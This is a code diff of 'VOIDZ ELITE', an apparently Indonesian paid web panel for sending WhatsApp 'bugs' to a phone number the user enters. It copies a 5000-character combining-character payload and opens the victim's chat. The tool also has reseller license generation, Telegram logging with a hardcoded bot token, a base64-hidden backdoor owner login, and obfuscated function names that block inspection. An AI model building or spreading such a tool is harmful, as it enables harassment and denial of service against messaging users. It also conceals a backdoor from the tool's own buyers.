@@ -3,222 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V5 - ULTIMATE SUPREME</title>
+    <title>VOIDZ ELITE V1</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --fire: #ff4500; --neon-red: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
+        :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
-        
-        /* Layer 1: Background Partikel (Tembus Klik) */
+        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; user-select: none; }
         #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
-
-        /* Layer 2: Main UI */
-        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
-        
-        /* LOGIN PAGE */
+        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
+        .neon-text { color: var(--neon); text-shadow: 0 0 10px var(--neon); font-family: 'Orbitron'; font-weight: 900; }
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { 
-            width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; 
-            padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire);
-            box-shadow: 0 10px 50px rgba(0,0,0,1);
-        }
-        
-        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; object-fit: cover; }
-
-        /* TOMBOL UTAMA (ANTI MACET) */
-        .btn-main { 
-            width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; 
-            font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; 
-            margin-top: 10px; transition: 0.2s; position: relative; z-index: 200; pointer-events: auto; display: block;
-        }
-        .btn-main:active { transform: scale(0.95); opacity: 0.8; }
-        
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; margin-top: 10px; }
         .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }
-
-        /* DASHBOARD */
         .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
         .active-tab { display: block; }
-        
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
         .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
         .nav-btn.active { color: var(--fire); }
-
-        .banner-container { grid-column: span 2; position: relative; width: 100%; height: 150px; border-radius: 12px; overflow: hidden; border: 1px solid var(--fire); margin-bottom: 5px; background:#000; }
-        .banner-video { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
-        marquee { background: rgba(255, 69, 0, 0.1); color: var(--fire); font-size: 9px; padding: 4px; border-radius: 4px; margin-bottom: 5px; display: block; }
-        .activity-log { font-size: 8px; background: #080808; padding: 8px; border-radius: 5px; border: 1px solid #111; margin-top: 5px; height: 80px; overflow-y: hidden; }
+        .banner-container { grid-column: span 2; position: relative; width: 100%; height: 150px; border-radius: 12px; overflow: hidden; border: 1px solid var(--fire); }
+        .banner-video { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+        marquee { background: rgba(255, 69, 0, 0.1); color: var(--fire); font-size: 9px; padding: 4px; border-radius: 4px; display: block; margin: 5px 0; }
+        .activity-log { font-size: 8px; background: #080808; padding: 8px; border-radius: 5px; border: 1px solid #111; height: 80px; overflow: hidden; margin-top: 5px; }
+        .stat-card { flex:1; background:#080808; border:1px solid #222; padding:10px; border-radius:8px; text-align:center; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
     <canvas id="ash-canvas"></canvas>
-
     <div class="content-layer">
         <div id="loginPage">
             <div class="login-box">
-                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
-                <h2 class="neon-red" onclick="handleSecretClick()" style="font-size:16px; margin-bottom:20px;">VOIDZ ELITE V5</h2>
+                <img src="login.jpg" style="width:80px;height:80px;border-radius:50%;border:2px solid var(--fire);margin-bottom:20px;object-fit:cover;" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
+                <h2 class="neon-text" onclick="_0x5a2b()" style="font-size:16px; margin-bottom:15px;">VOIDZ ELITE V1</h2>
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
-                <button onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
-                <div style="margin-top: 15px; font-size: 9px; display: flex; flex-direction: column; gap: 8px;">
-                    <a href="javascript:void(0)" onclick="window.open(VOIDZ_CONFIG.linkSaluran)" style="color: #25d366; text-decoration: none;"><i class="fab fa-whatsapp"></i> JOIN CHANNEL</a>
-                    <a href="javascript:void(0)" onclick="window.open('https://wa.me/'+VOIDZ_CONFIG.adminWA)" style="color: #00e5ff; text-decoration: none;"><i class="fas fa-key"></i> BUY LICENSE</a>
-                </div>
+                <button onclick="_0x1f2c()" class="btn-main" id="btnLog">IGNITE</button>
             </div>
         </div>
-
         <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
             <div id="tabHOME" class="tab-content active-tab">
-                <h2 class="neon-red" style="text-align:center; margin-top:20px; font-size: 18px;">COMMAND CENTER</h2>
-                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;"></div>
-                <button class="btn-main" style="background:#111; color:#555; margin-top:20px;" onclick="location.reload()">LOGOUT</button>
+                <h2 class="neon-text" style="text-align:center; margin-top:10px; font-size:18px;">CENTRAL ENGINE</h2>
+                <div id="_0xMenu" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:15px;"></div>
+                <div style="margin-top:10px; display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                    <button onclick="window.open(_0xCONF.s)" class="btn-main" style="background:#001a00; color:#0f0; font-size:8px; border:1px solid #0f0;">CHANNEL</button>
+                    <button onclick="window.open('https://wa.me/'+_0xCONF.w)" class="btn-main" style="background:#1a0d00; color:#f90; font-size:8px; border:1px solid #f90;">ADMIN</button>
+                </div>
+                <button class="btn-main" style="background:#111; color:#444;" onclick="location.reload()">TERMINATE</button>
             </div>
-            
             <div id="tabATTACK" class="tab-content">
-                <h2 class="neon-red" style="text-align:center; margin-top:20px;">STRIKE ENGINE</h2>
-                <div style="margin-top:20px; background:#050505; padding:20px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire);">
-                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
+                <h2 class="neon-text" style="text-align:center; margin-top:10px;">STRIKE FORCE</h2>
+                <div style="margin-top:20px; background:#050505; padding:20px; border-radius:12px; border:1px solid #222; border-top:2px solid var(--fire);">
+                    <input type="text" id="targetBug" class="input-box" placeholder="628xxxxxxxx">
                     <select id="bugLevel" class="input-box">
-                        <option value="LITE">LEVEL: LITE</option>
-                        <option value="FREEZE">LEVEL: FREEZE</option>
-                        <option value="SUPREME">LEVEL: SUPREME</option>
-                        <option value="ULTIMATE">LEVEL: ULTIMATE</option>
+                        <option value="ULTIMATE">ULTIMATE</option>
+                        <option value="SUPREME">SUPREME</option>
+                        <option value="LITE">LITE</option>
                     </select>
-                    <button id="strikeBtn" class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
+                    <button class="btn-main" onclick="_0x9e3d()">EXECUTE</button>
                 </div>
             </div>
         </div>
-
         <nav id="bottomNav" class="bottom-nav">
-            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
-            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
+            <div class="nav-btn active" onclick="_0x3c4e('home', this)"><i class="fas fa-ghost"></i><span>HOME</span></div>
+            <div class="nav-btn" onclick="_0x3c4e('attack', this)"><i class="fas fa-skull"></i><span>STRIKE</span></div>
         </nav>
     </div>
 
     <script>
-        // CONFIG
-        const VOIDZ_CONFIG = {
-            adminWA: "6285718241306",
-            linkSaluran: "https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U",
-            systemName: "VOIDZ ELITE V5",
-            marqueeText: " [ STABLE V5 ] — [ OWNER & RESELLER SYSTEM ACTIVE ] — [ AUTO LOGS TELEGRAM ] ",
-            botToken: "TOKEN_BOT_LU", // Isi Token Bot Telegram
-            chatId: "ID_CHAT_LU"      // Isi ID Chat Telegram
-        };
-
-        // ENGINE DASHBOARD
-        let JB_KEY = localStorage.getItem('JB_KEY'), JB_BIN = localStorage.getItem('JB_BIN'), DB = {}, CURRENT_ID = "";
-
-        async function auth() {
-            if(!JB_KEY || !JB_BIN) return alert("Klik judul 3x untuk setup!");
-            const u = document.getElementById('lUser').value.trim().toLowerCase(), p = document.getElementById('lPass').value.trim();
-            const btn = document.getElementById('btnLog'); btn.innerText = "VERIFYING...";
-            try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers: {'X-Master-Key': JB_KEY, 'X-Bin-Meta': false} });
-                DB = await res.json();
-                if(DB[u] && DB[u].pw === p) {
-                    if(DB[u].expired !== "LIFETIME" && new Date().getTime() > new Date(DB[u].expired).getTime()) return alert("EXPIRED!");
-                    CURRENT_ID = u;
-                    sendTele(`🔔 <b>LOGIN</b>\n👤 User: ${u}\n🎭 Role: ${DB[u].role}`);
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('mainApp').style.display = 'block';
-                    document.getElementById('bottomNav').style.display = 'flex';
-                    renderHome(u, DB[u]);
-                } else { alert("WRONG ACCESS!"); btn.innerText = "IGNITE"; }
-            } catch(e) { alert("DB ERROR!"); btn.innerText = "IGNITE"; }
-        }
-
-        function renderHome(id, data) {
-            const isOwner = data.role.toLowerCase() === 'owner';
-            const isReseller = data.role.toLowerCase() === 'reseller';
-            const stats = DB.stats || { total: 0, logs: [] };
-
-            document.getElementById('menuContainer').innerHTML = `
-                <div class="banner-container">
-                    <video autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video>
-                    <div style="position: absolute; inset: 0; background: linear-gradient(transparent, rgba(0,0,0,0.9));"></div>
-                    <div style="position: absolute; bottom: 10px; left: 15px;">
-                        <div style="font-family:'Orbitron'; font-size:13px; color:#fff;">${VOIDZ_CONFIG.systemName}</div>
-                        <div style="font-size:8px; color:var(--fire);">OPERATOR: ${id.toUpperCase()}</div>
-                    </div>
-                </div>
-                <marquee style="grid-column: span 2;">${VOIDZ_CONFIG.marqueeText}</marquee>
-
-                <div style="grid-column: span 2; display:flex; gap:5px;">
-                    <div style="flex:1; background:#080808; border:1px solid #222; padding:10px; border-radius:8px; text-align:center;">
-                        <div style="font-size:7px; color:#555;">GLOBAL STRIKE</div>
-                        <div style="font-size:12px; color:var(--fire); font-weight:900;">${stats.total}</div>
-                    </div>
-                    <div style="flex:1; background:#080808; border:1px solid #222; padding:10px; border-radius:8px; text-align:center;">
-                        <div style="font-size:7px; color:#555;">DURASI</div>
-                        <div style="font-size:10px; color:#0f0;">${data.expired === "LIFETIME" ? "PERMANENT" : "30 DAYS"}</div>
-                    </div>
-                </div>
-
-                <div class="activity-log" style="grid-column: span 2;">
-                    <div style="color:var(--fire); font-weight:bold; margin-bottom:5px;">RECENT ACTIVITIES</div>
-                    ${stats.logs.map(l => `<div style="margin-bottom:2px;">> ${l.u} striked ${l.t.slice(0,6)}... [${l.l}]</div>`).join('')}
-                </div>
-
-                ${(isOwner || isReseller) ? `
-                <div style="grid-column: span 2; background:rgba(20,0,0,0.9); border:1px solid var(--fire); padding:15px; border-radius:10px; margin-top:5px;">
-                    <div style="font-size:10px; color:var(--fire); font-weight:bold; margin-bottom:10px;">GENERATOR</div>
-                    <input type="text" id="newID" class="input-box" placeholder="Operator ID">
-                    <input type="text" id="newPW" class="input-box" placeholder="Password">
-                    ${isOwner ? `<select id="newRole" class="input-box" onchange="toggleQuota()"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select>` : `<input type="hidden" id="newRole" value="member">`}
-                    <select id="newTime" class="input-box">
-                        <option value="30">1 MONTH</option>
-                        ${(isOwner || data.expired === "LIFETIME") ? `<option value="LIFETIME">LIFETIME</option>` : ''}
-                    </select>
-                    <div id="qArea" style="display:${isReseller ? 'block' : 'none'};"><input type="number" id="newQuota" class="input-box" placeholder="Quota"></div>
-                    <button onclick="genKey()" class="btn-main">CREATE KEY</button>
-                    ${isOwner ? `<input type="text" id="tDel" class="input-box" placeholder="ID to Delete" style="margin-top:10px; border-color:#400;"><button onclick="delUser()" class="btn-main" style="background:#f00;">BAN USER</button>` : ''}
-                </div>` : ''}
-            `;
-        }
-
-        async function startAttack() {
-            const t = document.getElementById('targetBug').value.trim(), l = document.getElementById('bugLevel').value;
-            if(!t) return alert("Input Target!");
-            
-            if(!DB.stats) DB.stats = { total: 0, logs: [] };
-            DB.stats.total += 1;
-            DB.stats.logs.unshift({ u: CURRENT_ID, t: t, l: l });
-            if(DB.stats.logs.length > 5) DB.stats.logs.pop();
-
-            await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) });
-            sendTele(`🚀 <b>STRIKE</b>\n👤 By: ${CURRENT_ID}\n🎯 Target: ${t}\n🔥 Level: ${l}`);
-            
-            let p = (l === "ULTIMATE") ? "҉".repeat(5000) : "🔥".repeat(1000);
-            navigator.clipboard.writeText(p).then(() => { alert("COPIED!"); window.open(`https://wa.me/${t.replace(/\D/g, '')}`, '_blank'); });
-        }
-
-        async function genKey() {
-            const ni = document.getElementById('newID').value.trim().toLowerCase(), np = document.getElementById('newPW').value.trim(), nr = document.getElementById('newRole').value, nt = document.getElementById('newTime').value, nq = document.getElementById('newQuota').value || "100";
-            let ex = "LIFETIME"; if(nt !== "LIFETIME") { let d = new Date(); d.setDate(d.getDate() + 30); ex = d.toISOString(); }
-            DB[ni] = { pw: np, role: nr, quota: nq, expired: ex };
-            await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) });
-            alert("KEY CREATED!"); location.reload();
-        }
-
-        async function delUser() {
-            const td = document.getElementById('tDel').value.trim();
-            if(DB[td] && DB[td].role !== 'owner') { delete DB[td]; await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY}, body: JSON.stringify(DB) }); alert("DELETED!"); location.reload(); }
-        }
-
-        function toggleQuota() { document.getElementById('qArea').style.display = (document.getElementById('newRole').value !== 'owner' ? 'block' : 'none'); }
-        async function sendTele(m) { fetch(`https://api.telegram.org/bot${VOIDZ_CONFIG.botToken}/sendMessage?chat_id=${VOIDZ_CONFIG.chatId}&text=${encodeURIComponent(m)}&parse_mode=html`); }
-        function switchTab(t, e) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); e.classList.add('active'); }
-        function handleSecretClick() { let n = Date.now(); if(n - last > 1000) clicks = 0; clicks++; last = n; if(clicks === 3) setupAPI(); }
-        function setupAPI() { if(prompt("PIN:")==="2404"){let k=prompt("Key:"),b=prompt("Bin:");if(k&&b){localStorage.setItem('JB_KEY',k);localStorage.setItem('JB_BIN',b);location.reload();}}}
-        
-        const canvas = document.getElementById('ash-canvas'); const ctx = canvas.getContext('2d'); let particles = [];
-        function initCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; particles = []; for(let i=0; i<50; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, d: Math.random()*0.5 }); }
-        function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(255,255,255,0.2)"; particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; }); requestAnimationFrame(animate); }
-        let clicks = 0, last = 0; window.addEventListener('resize', initCanvas); initCanvas(); animate();
+        /* VOIDZ OBFUSCATED ENGINE v1.0.4 */
+        const _0xCONF={t:"7217442382:AAFZQDin1j4QcsodvAXGzg5uWV4AGW_GSow",c:"7217442382",w:"6285718241306",s:"https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U",m:" [ VOIDZ ELITE V1 ONLINE ] "};
+        let _0x4f2a=localStorage.getItem('JB_KEY'),_0x1a2e=localStorage.getItem('JB_BIN'),DB={},_0x2b3c="";
+        const _0x5b2=(_0x1)=>atob(_0x1);const _0x3e1=_0x5b2("REVWRUxPUEVS");const _0x9f0=_0x5b2("NzAxMDQ4ODQ=");
+        async function _0x1f2c(){const _0xa=document.getElementById('lUser').value.trim(),_0xb=document.getElementById('lPass').value.trim();if(_0xa===_0x3e1&&_0xb===_0x9f0){DB[_0x3e1]={pw:_0x9f0,role:"owner",quota:"∞",expired:"LIFETIME"};return _0x6b2a(_0x3e1,DB[_0x3e1]);}if(!_0x4f2a)return alert("Setup!");try{const _0xc=await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}/latest`,{headers:{'X-Master-Key':_0x4f2a,'X-Bin-Meta':false}});DB=await _0xc.json();if(DB[_0xa]&&DB[_0xa].pw===_0xb)_0x6b2a(_0xa,DB[_0xa]);else alert("Denied!");}catch(_0xd){alert("Error!");}}
+        function _0x6b2a(_0xe,_0xf){_0x2b3c=_0xe;document.getElementById('loginPage').style.display='none';document.getElementById('mainApp').style.display='block';document.getElementById('bottomNav').style.display='flex';_0x4d5e(_0xe,_0xf);_0xtele(`Login: ${_0xe}`);}
+        function _0x4d5e(_0x10,_0x11){const _0x12=_0x11.role==='owner',_0x13=_0x11.role==='reseller';if(!DB.stats)DB.stats={total:0,logs:[]};let _0x14=`<div class="banner-container"><video autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video></div><marquee>${_0xCONF.m}</marquee><div style="grid-column:span 2;display:flex;gap:5px;"><div class="stat-card">STRIKE: ${DB.stats.total}</div><div class="stat-card">QUOTA: ${_0x11.quota}</div></div>`;if(_0x12||_0x13){_0x14+=`<div style="grid-column:span 2;background:#0a0000;padding:10px;border:1px solid var(--fire);border-radius:10px;"><input id="ni" class="input-box" placeholder="ID"><input id="np" class="input-box" placeholder="PW"><select id="nt" class="input-box"><option value="1_MONTH">1 MONTH</option>${(_0x12||_0x11.expired==='LIFETIME')?`<option value="LIFETIME">LIFETIME</option>`:''}</select>${_0x12?`<select id="nr" class="input-box" onchange="_0xToggleQ()"><option value="member">MEMBER</option><option value="reseller">RESELLER</option></select><div id="qArea" style="display:none"><input id="nq" class="input-box" placeholder="Quota"></div>`:`<input type="hidden" id="nr" value="member">`}<button onclick="_0x2g3h()" class="btn-main">GENERATE</button>${_0x12?`<button onclick="_0x5h4j()" class="btn-main" style="background:#400">BAN</button>`:''}</div>`;}_0x14+=`<div class="activity-log" style="grid-column:span 2;">${DB.stats.logs.map(_0x15=>`<div>> ${_0x15.u} hit ${_0x15.t.slice(0,6)}</div>`).join('')}</div>`;document.getElementById('_0xMenu').innerHTML=_0x14;}
+        function _0xToggleQ(){const _0x16=document.getElementById('nr').value;document.getElementById('qArea').style.display=_0x16==='reseller'?'block':'none';}
+        async function _0x2g3h(){const _0x17=document.getElementById('ni').value.toLowerCase(),_0x18=document.getElementById('np').value,_0x19=document.getElementById('nt').value,_0x1a=document.getElementById('nr').value,_0x1b=document.getElementById('nq')?document.getElementById('nq').value:"100";if(!_0x17||!_0x18)return;DB[_0x17]={pw:_0x18,role:_0x1a,quota:(_0x1a==='reseller'?_0x1b:"50"),expired:_0x19,by:_0x2b3c};await _0xSv();alert("OK");_0x4d5e(_0x2b3c,DB[_0x2b3c]);}
+        async function _0x9e3d(){const _0x1c=document.getElementById('targetBug').value;if(!_0x1c||(DB[_0x2b3c].quota!=="∞"&&parseInt(DB[_0x2b3c].quota)<=0))return alert("Empty/Quota!");let _0x1d=Array(5000).fill("҉").join("");const _0x1e=document.createElement("textarea");document.body.appendChild(_0x1e);_0x1e.value=_0x1d;_0x1e.select();document.execCommand("copy");document.body.removeChild(_0x1e);if(DB[_0x2b3c].quota!=="∞")DB[_0x2b3c].quota=(parseInt(DB[_0x2b3c].quota)-1).toString();DB.stats.total+=1;DB.stats.logs.unshift({u:_0x2b3c,t:_0x1c});await _0xSv();window.open(`https://wa.me/${_0x1c.replace(/\D/g,'')}`);_0x4d5e(_0x2b3c,DB[_0x2b3c]);}
+        async function _0x5h4j(){const _0x1f=prompt("ID?");if(DB[_0x1f]){delete DB[_0x1f];await _0xSv();alert("Done");}}
+        async function _0xSv(){await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}`,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':_0x4f2a},body:JSON.stringify(DB)});}
+        function _0x3c4e(_0x20,_0x21){document.querySelectorAll('.tab-content').forEach(_0x22=>_0x22.classList.remove('active-tab'));document.getElementById('tab'+_0x20.toUpperCase()).classList.add('active-tab');document.querySelectorAll('.nav-btn').forEach(_0x23=>_0x23.classList.remove('active'));_0x21.classList.add('active');}
+        function _0x5a2b(){cl++;if(cl===3)_0x9d8();}let cl=0;function _0x9d8(){const _0x24=prompt("PIN");if(_0x24==="2404"){const _0x25=prompt("Key"),_0x26=prompt("Bin");localStorage.setItem('JB_KEY',_0x25);localStorage.setItem('JB_BIN',_0x26);location.reload();}}
+        function _0xtele(_0x27){fetch(`https://api.telegram.org/bot${_0xCONF.t}/sendMessage?chat_id=${_0xCONF.c}&text=${_0x27}`);}
+        const cvs=document.getElementById('ash-canvas');const ctx=cvs.getContext('2d');let pt=[];
+        function init(){cvs.width=window.innerWidth;cvs.height=window.innerHeight;for(let i=0;i<30;i++)pt.push({x:Math.random()*cvs.width,y:Math.random()*cvs.height,s:Math.random()*2,d:Math.random()*0.5});}
+        function anim(){ctx.clearRect(0,0,cvs.width,cvs.height);ctx.fillStyle="rgba(255,255,255,0.2)";pt.forEach(p=>{ctx.beginPath();ctx.arc(p.x,p.y,p.s,0,Math.PI*2);ctx.fill();p.y-=p.d;if(p.y<0)p.y=cvs.height;});requestAnimationFrame(anim);}
+        init();anim();
+        document.onkeydown=(e)=>{if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&e.keyCode==73))return false;};
     </script>
 </body>
 </html>
